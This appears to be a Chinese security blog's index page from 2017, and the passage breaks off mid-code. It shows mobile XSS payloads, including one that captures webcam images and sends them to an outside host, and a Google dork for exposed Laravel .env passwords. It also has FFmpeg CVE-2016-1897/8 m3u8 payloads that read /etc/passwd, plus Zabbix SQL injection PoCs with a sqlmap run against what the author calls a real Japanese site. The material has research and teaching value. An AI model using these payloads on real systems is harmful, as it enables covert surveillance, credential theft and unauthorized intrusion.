<p><code>&lt;svg•onload=alert(1)&gt;</code>  %0C<br><a class="link" target="_blank" rel="noopener" href="https://markitzeroday.com/character-restrictions/xss/2017/07/26/xss-without-dots.html">https://markitzeroday.com/character-restrictions/xss/2017/07/26/xss-without-dots.html<i class="fas fa-external-link-alt"></i></a></p>
<p>跳出<code>&lt;input&gt;</code>标签<code>&quot;&gt;</code></p>
<p>==========XSS in Mobile Devices==========</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onorientationchange=alert(orientation)&gt;</span><br><span class="line">&lt;html ontouchstart=alert(1)&gt;</span><br><span class="line">&lt;html ontouchend=alert(1)&gt;</span><br><span class="line">&lt;html ontouchmove=alert(1)&gt;</span><br><span class="line">&lt;html ontouchcancel=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(navigator.connection.type)&gt;</span><br><span class="line">&lt;svg onload=alert(navigator.battery.level)&gt;</span><br><span class="line">&lt;svg onload=alert(navigator.battery.dischargingTime)&gt;</span><br><span class="line">&lt;svg onload=alert(navigator.battery.charging)&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">navigator.geolocation.getCurrentPosition(function(p)&#123;</span><br><span class="line">alert(&#x27;Latitude:&#x27;+p.coords.latitude+&#x27;,Longitude:&#x27;+</span><br><span class="line">p.coords.longitude+&#x27;,Altitude:&#x27;+p.coords.altitude);&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">(remember to change “+” for “%2B” in URLs)</span><br><span class="line">&lt;script&gt;</span><br><span class="line">d=document;</span><br><span class="line">v=d.createElement(‘video’);</span><br><span class="line">c=d.createElement(‘canvas’);</span><br><span class="line">c.width=640;</span><br><span class="line">c.height=480;</span><br><span class="line">navigator.webkitGetUserMedia(&#123;‘video’:true&#125;,function(s)&#123;</span><br><span class="line">v.src=URL.createObjectURL(s);v.play()&#125;,function()&#123;&#125;);</span><br><span class="line">c2=c.getContext(‘2d’);</span><br><span class="line">x=’c2.drawImage(v,0,0,640,480);fetch(“//HOST/”+c2.canvas.toDataURL())‘;</span><br><span class="line">setInterval(x,5000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">open(c2.canvas.toDataURL())</span><br><span class="line">&lt;svg onload=navigator.vibrate(500)&gt;</span><br><span class="line">&lt;svg onload=navigator.vibrate([500,300,100])&gt;</span><br></pre></td></tr></table></figure>

<p><img lazyload src="/images/loading.svg" data-src="15277800077419.jpg"></p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Mar 05 2017 21:00:00 GMT+0800">2017-03-05</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/XSS/">XSS</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/XSS%20Tips%20%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/Laravel%20applications%20sensitive%20info%20leak/">
                        Laravel applications sensitive info leak
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        .env 文件位于项目根目录下，作为全局环境配置文件。
google hack &quot;DB_PASSWORD&quot; filetype:env


以下内容引用自https://www.cnblogs.com/yingww/p/5607766.html
.env文件含有数据库账号密码等敏感数据，在laravel5.2中，在本地访问127.0.0.1/laravel/.env可直接访问到.env
为避免.env被直接访问，可使用重定向，方法如下：
在根目录下添加.htaccess文件（与.env处于同一个目录，Apache必须开启重定向扩展）.htaccess文件内容如下：
将所有的的请求都重定向到public目录下
12345&lt;IfModule mod_rewrite.c&gt;RewriteEngine onRewriteRule    ^$    public/    [L]RewriteRule    (.*) public/$1    [L]&lt;/IfModule&gt;
这时将无法访问127.0.0.1/laravel/.env

                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>.env 文件位于项目根目录下，作为全局环境配置文件。</p>
<p>google hack <code>&quot;DB_PASSWORD&quot; filetype:env</code></p>
<p><img lazyload src="/images/loading.svg" data-src="15196236145939.jpg"></p>
<p><img lazyload src="/images/loading.svg" data-src="15196237064982.jpg"></p>
<p>以下内容引用自<code>https://www.cnblogs.com/yingww/p/5607766.html</code></p>
<p>.env文件含有数据库账号密码等敏感数据，在laravel5.2中，在本地访问127.0.0.1/laravel/.env可直接访问到.env</p>
<p>为避免.env被直接访问，可使用重定向，方法如下：</p>
<p>在根目录下添加.htaccess文件（与.env处于同一个目录，Apache必须开启重定向扩展）<br>.htaccess文件内容如下：</p>
<p>将所有的的请求都重定向到public目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteRule    ^$    public/    [L]</span><br><span class="line">RewriteRule    (.*) public/$1    [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<p>这时将无法访问127.0.0.1/laravel/.env</p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Feb 26 2017 21:00:00 GMT+0800">2017-02-26</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Web/">Web</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Laravel%20applications%20sensitive%20info%20leak/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/CVE-2016-1897-8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
                        CVE-2016-1897/8 - FFMpeg漏洞分析
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。功能非常强大，是每个视频网站必不可少的多媒体文件处理程序。
0x01 漏洞概述在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。
这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样，这里就一起分析了。
0x02 HLS（HTTP Live Streaming）由于漏洞是出现在解析HLS流媒体文件出的问题，所以我们必须先了解HLS。
HLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和Iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 Playlist）文件，里面包含了这次HLS会话的所有数据。

如图所示，有一个主要的m3u8格式Playlist文件，里面可以包含下级的m3u8文件，客户端会再去索引下级的m3u8，继续解析下级的Playlist文件获取最终的TS流文件的http请求地址与时间段。
http://pl.youku.com/playlist/m3u8?vid=340270152&amp;type=3gphd&amp;ts=1462714824&amp;keyframe=0&amp;ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2&amp;sid=746271452251312590fab&amp;token=3319&amp;ctype=12&amp;ev=1&amp;oip=3395898128
这是youku一个视频的m3u8文件，内容如下：
12345678#EXTM3U#EXT-X-TARGETDURATION:6#EXT-X-VERSION:2#EXTINF:6,http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&amp;ts_end=5.9&amp;ts_seg_no=0&amp;ts_keyframe=1#EXTINF:0,http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&amp;ts_end=6.367&amp;ts_seg_no=1&amp;ts_keyframe=1#EXT-X-ENDLIST

解析：
12345#EXTM3U 标签是m3u8的文件头，开头必须要这一行#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒#EXT-X-VERSION:2 该标签可有可无#EXTINF:6, 表示该一段TS流文件的长度#EXT-X-ENDLIST 这个相当于文件结束符

这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。
0x03 漏洞原理SSRF漏洞：
直接用FFMpeg解析一个多媒体文件
12345#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,http://192.168.123.100:8080/1.html#EXT-X-ENDLIST

（#EXT-X-MEDIA-SEQUENCE或#EXT-X-TARGETDURATION必须存在任意一个，前者是定义ts流文件的序号。去掉会报错：无效文件）

ffmpeg -i test.m3u8 test.mp4（也可把m3u8格式改成其他后缀，ffmpeg会自动识别为HLS流文件）

直接发起了http请求，这就造成一个SSRF。
结合SSRF任意文件读取：
FFMpeg支持很多扩展协议，其中的concat:协议可以合并多个流URL，官方称为Physical concatenation protocol
这样可以合并多个URL concat:URL1|URL2|...|URLN
新建一个主HLS文件h.m3u8在web服务器
12345#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://xxx/test.txt|http://xxx/test.txt （这两个txt都是m3u8,后缀可以随便改，ffmpeg会自动识别）#EXT-X-ENDLIST

再创建一个下级的m3u8文件 test.txt，最终的请求会引到最下级的m3u8文件,也就是这个test.txt
1234#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:,http://xxx.com/?

再用ffmpeg处理test.m3u8
12345#EXTM3U#EXT-X-TARGETDURATION:6#EXTINF:10.0,concat:http://xxx/h.m3u8#EXT-X-ENDLIST


提示当读取第一段的时候出错，URL是http://xxx/?#EXTM3U，但我们建立的那个下级的m3u8文件 test.txt是http://xxx.com/?，多出来的“#EXTM3U，”这部分是用concat协议合并的那个txt，http://xxx/test.txt的第一行；而ffmpeg支持多种协议获取输入流，http、ftp、smb、file等，既然用concat协议可以读取文件的第一行，那把http换成file协议就可以读取本地文件了，漏洞就出在这里。
主m3u8文件改成concat:http://xxx/test.txt|file:///etc/passwd，再请求就能读取到passwd文件的第一行，当然也可以读取内网网站的信息。

但这样就只能读取一行，意义不大。但FFMpeg支持一个截取数据流片段的功能：subfile。用法：subfile,,start,153391104,end,268142592,,:/media/dvd/VIDEO_TS/VTS_08_1.VOB
Start后是开始截取的偏移量，以字节为单位，end是结束的偏移量。
既然可以截取数据流就可以利用subfile获取比较完整的文件了。测试时候一次最多只能截取32字节，所以要继续用concat合并多个数据流片段。
12345#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://198.56.193.29:8080/test.txt|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd#EXT-X-ENDLIST

这样就可以读取任意文件的任意内容
0x04 绕过大小检测之前的ImageMagick漏洞因为有些网站有文件大小检测而无法攻击，在这个漏洞中的测试我也发现一些网站有对上传视频文件的大小限制。这里有方法可以扩充文件大小。

直接扩充#EXTINF，这个标签前面说过，是代表TS流文件的时间长度，可以无限扩充，直到符合大小为止，仍可正常解析。

                    
                </div> -->
                <div class="article-content markdown-body">
                    <p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。功能非常强大，是每个视频网站必不可少的多媒体文件处理程序。</p>
<h3 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h3><p>在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。</p>
<p>这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样，这里就一起分析了。</p>
<h3 id="0x02-HLS（HTTP-Live-Streaming）"><a href="#0x02-HLS（HTTP-Live-Streaming）" class="headerlink" title="0x02 HLS（HTTP Live Streaming）"></a>0x02 HLS（HTTP Live Streaming）</h3><p>由于漏洞是出现在解析HLS流媒体文件出的问题，所以我们必须先了解HLS。</p>
<p>HLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和Iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 Playlist）文件，里面包含了这次HLS会话的所有数据。</p>
<p><img lazyload src="/images/loading.svg" data-src="15190491731192.png"></p>
<p>如图所示，有一个主要的m3u8格式Playlist文件，里面可以包含下级的m3u8文件，客户端会再去索引下级的m3u8，继续解析下级的Playlist文件获取最终的TS流文件的http请求地址与时间段。</p>
<p><code>http://pl.youku.com/playlist/m3u8?vid=340270152&amp;type=3gphd&amp;ts=1462714824&amp;keyframe=0&amp;ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2&amp;sid=746271452251312590fab&amp;token=3319&amp;ctype=12&amp;ev=1&amp;oip=3395898128</code></p>
<p>这是youku一个视频的m3u8文件，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-TARGETDURATION:6</span><br><span class="line">#EXT-X-VERSION:2</span><br><span class="line">#EXTINF:6,</span><br><span class="line">http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&amp;ts_end=5.9&amp;ts_seg_no=0&amp;ts_keyframe=1</span><br><span class="line">#EXTINF:0,</span><br><span class="line">http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&amp;ts_end=6.367&amp;ts_seg_no=1&amp;ts_keyframe=1</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U 标签是m3u8的文件头，开头必须要这一行</span><br><span class="line">#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒</span><br><span class="line">#EXT-X-VERSION:2 该标签可有可无</span><br><span class="line">#EXTINF:6, 表示该一段TS流文件的长度</span><br><span class="line">#EXT-X-ENDLIST 这个相当于文件结束符</span><br></pre></td></tr></table></figure>

<p>这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。</p>
<h3 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h3><p>SSRF漏洞：</p>
<p>直接用FFMpeg解析一个多媒体文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">http://192.168.123.100:8080/1.html</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>

<p>（<code>#EXT-X-MEDIA-SEQUENCE</code>或<code>#EXT-X-TARGETDURATION</code>必须存在任意一个，前者是定义ts流文件的序号。去掉会报错：无效文件）</p>
<p><img lazyload src="/images/loading.svg" data-src="15190491870890.png"></p>
<p><code>ffmpeg -i test.m3u8 test.mp4</code>（也可把m3u8格式改成其他后缀，ffmpeg会自动识别为HLS流文件）</p>
<p><img lazyload src="/images/loading.svg" data-src="15190491935906.png"></p>
<p>直接发起了http请求，这就造成一个SSRF。</p>
<p>结合SSRF任意文件读取：</p>
<p>FFMpeg支持很多扩展协议，其中的concat:协议可以合并多个流URL，官方称为<code>Physical concatenation protocol</code></p>
<p>这样可以合并多个<code>URL concat:URL1|URL2|...|URLN</code></p>
<p>新建一个主HLS文件h.m3u8在web服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://xxx/test.txt|http://xxx/test.txt （这两个txt都是m3u8,后缀可以随便改，ffmpeg会自动识别）</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>

<p>再创建一个下级的m3u8文件 test.txt，最终的请求会引到最下级的m3u8文件,也就是这个test.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:,</span><br><span class="line">http://xxx.com/?</span><br></pre></td></tr></table></figure>

<p>再用ffmpeg处理test.m3u8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-TARGETDURATION:6</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://xxx/h.m3u8</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>

<p><img lazyload src="/images/loading.svg" data-src="15190492016464.png"></p>
<p>提示当读取第一段的时候出错，URL是<code>http://xxx/?#EXTM3U</code>，但我们建立的那个下级的m3u8文件 test.txt是<code>http://xxx.com/?</code>，多出来的“#EXTM3U，”这部分是用concat协议合并的那个txt，<code>http://xxx/test.txt</code>的第一行；而ffmpeg支持多种协议获取输入流，http、ftp、smb、file等，既然用concat协议可以读取文件的第一行，那把http换成file协议就可以读取本地文件了，漏洞就出在这里。</p>
<p>主m3u8文件改成<code>concat:http://xxx/test.txt|file:///etc/passwd</code>，再请求就能读取到passwd文件的第一行，当然也可以读取内网网站的信息。</p>
<p><img lazyload src="/images/loading.svg" data-src="15190492101652.png"></p>
<p>但这样就只能读取一行，意义不大。但FFMpeg支持一个截取数据流片段的功能：<code>subfile</code>。用法：<code>subfile,,start,153391104,end,268142592,,:/media/dvd/VIDEO_TS/VTS_08_1.VOB</code></p>
<p>Start后是开始截取的偏移量，以字节为单位，end是结束的偏移量。</p>
<p>既然可以截取数据流就可以利用subfile获取比较完整的文件了。测试时候一次最多只能截取32字节，所以要继续用concat合并多个数据流片段。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://198.56.193.29:8080/test.txt|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>

<p>这样就可以读取任意文件的任意内容</p>
<h3 id="0x04-绕过大小检测"><a href="#0x04-绕过大小检测" class="headerlink" title="0x04 绕过大小检测"></a>0x04 绕过大小检测</h3><p>之前的ImageMagick漏洞因为有些网站有文件大小检测而无法攻击，在这个漏洞中的测试我也发现一些网站有对上传视频文件的大小限制。这里有方法可以扩充文件大小。</p>
<p><img lazyload src="/images/loading.svg" data-src="15190492179802.png"></p>
<p>直接扩充#EXTINF，这个标签前面说过，是代表TS流文件的时间长度，可以无限扩充，直到符合大小为止，仍可正常解析。</p>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Feb 19 2017 21:00:00 GMT+0800">2017-02-19</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Web/">Web</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/CVE-2016-1897-8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
            <li class="home-article-item">

                

                <h3 class="home-article-title">
                    <a href="/zabbix%20SQL%20Inject%20Vul/">
                        zabbix SQL Inject Vul
                    </a>
                </h3>

                <!-- <div class="home-article-content markdown-body">
                    
                        zabbix是一个开源的企业级性能监控解决方案。近日，zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。
0x01 漏洞概述无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。
0x02 影响程度
攻击成本：低
危害程度：高
是否登陆：不需要
影响版本：2.2.x，3.0.0-3.0.3

0x03 漏洞测试在zabbix的地址后面添加：

利用方式一

/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim estamp=1471054088083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2’3297&amp;updateProfil e=true&amp;screenitemid=&amp;period=3600&amp;stime=20170813040734&amp;resourcetype= 17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp; mark_color=1
如果出现下列代码则证明漏洞存在
&lt;div class=&quot;flickerfreescreen&quot; data-timestamp=&quot;1471054088083&quot; id=&quot;flickerfreescreen_1&quot;&gt;&lt;table class=&quot;list-table&quot; id=&quot;t57ae81946b8cb&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;cell- width&quot;&gt;Timestamp&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;nothing-to-show&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;No data found.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&quot;msg-bad&quot;&gt;&lt;div class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (39, 1, &#39;web.item.graph.period&#39;, &#39;3600&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_str, type, idx2) VALUES (40, 1, &#39;web.item.graph.stime&#39;, &#39;20160813041028&#39;, 3, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (41, 1, &#39;web.item.graph.isnow&#39;, &#39;1&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;span class=&quot;overlay-close-btn&quot; onclick=&quot;javascript: $(this).closest(&#39;.msg-bad&#39;).remove();&quot; title=&quot;Close&quot;&gt;&lt;/span&gt;&lt;/div&gt;

利用方式二

latest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385);select * from users where (1=1
如果出现下列代码则证明漏洞存在
SQL (0.000361):INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES(88, 1, &#39;web.latest.toggle&#39;, &#39;1&#39;, 2, 15385); select * from users where (1=1) latest.php:746 →require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in/home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185
0x04 实战测试测试的一个Japan站
sqlmap -u &quot;http://157.×××.×××.98/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1(select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&quot; --level=3 --risk=2 --columns -T &quot;users&quot; -D &quot;public&quot;
1234567891011121314151617181920212223Database: publicTable: users[16 columns]+----------------+---------+| Column         | Type    |+----------------+---------+| alias          | varchar || attempt_clock  | int4    || attempt_failed | int4    || attempt_ip     | varchar || autologin      | int4    || autologout     | int4    || lang           | varchar || name           | varchar || passwd         | bpchar  || refresh        | int4    || rows_per_page  | int4    || surname        | varchar || theme          | varchar || type           | int4    || url            | varchar || userid         | int8    |+----------------+---------+

可获得最高权限
0x05 代码分析zabbix 2.2.14

首先从poc中的jsrpc.php文件入手，

1234567891011require_once dirname(__FILE__).&#x27;/include/config.inc.php&#x27;;$requestType = get_request(&#x27;type&#x27;, PAGE_TYPE_JSON);if ($requestType == PAGE_TYPE_JSON) &#123;    $http_request = new CHTTP_request();    $json = new CJSON();    $data = $json-&gt;decode($http_request-&gt;body(), true);&#125;else &#123;    $data = $_REQUEST;&#125;

从这里看到data是由REQUEST赋值的，接受 GET/POST/COOKIE任意一种输入，所以payload可以用get方式传输，在payload中由method=screen.get这一部分，在源码中可以看到如下代码
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051case &#x27;screen.get&#x27;:        $options = array(            &#x27;pageFile&#x27; =&gt; !empty($data[&#x27;pageFile&#x27;]) ? $data[&#x27;pageFile&#x27;] : null,            &#x27;mode&#x27; =&gt; !empty($data[&#x27;mode&#x27;]) ? $data[&#x27;mode&#x27;] : null,            &#x27;timestamp&#x27; =&gt; !empty($data[&#x27;timestamp&#x27;]) ? $data[&#x27;timestamp&#x27;] : time(),            &#x27;resourcetype&#x27; =&gt; !empty($data[&#x27;resourcetype&#x27;]) ? $data[&#x27;resourcetype&#x27;] : null,            &#x27;screenitemid&#x27; =&gt; !empty($data[&#x27;screenitemid&#x27;]) ? $data[&#x27;screenitemid&#x27;] : null,            &#x27;groupid&#x27; =&gt; !empty($data[&#x27;groupid&#x27;]) ? $data[&#x27;groupid&#x27;] : null,            &#x27;hostid&#x27; =&gt; !empty($data[&#x27;hostid&#x27;]) ? $data[&#x27;hostid&#x27;] : null,            &#x27;period&#x27; =&gt; 